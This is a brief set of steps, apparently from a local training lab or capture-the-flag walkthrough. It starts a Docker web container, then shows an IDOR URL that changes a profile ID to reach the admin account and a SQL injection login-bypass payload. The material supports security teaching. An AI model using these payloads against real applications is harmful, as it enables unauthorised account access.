// 1. Build and start the web container
docker compose up -d
 
// 2. Stage 02 (IDOR) - Modify the user profile ID parameter in the URL to access Admin (ID=1)
http://localhost:80/profile.php?id=1
 
// 3. Stage 03 (SQLi) - Inject authentication bypass / UNION payload into the login gateway
' OR 1=1 -- -
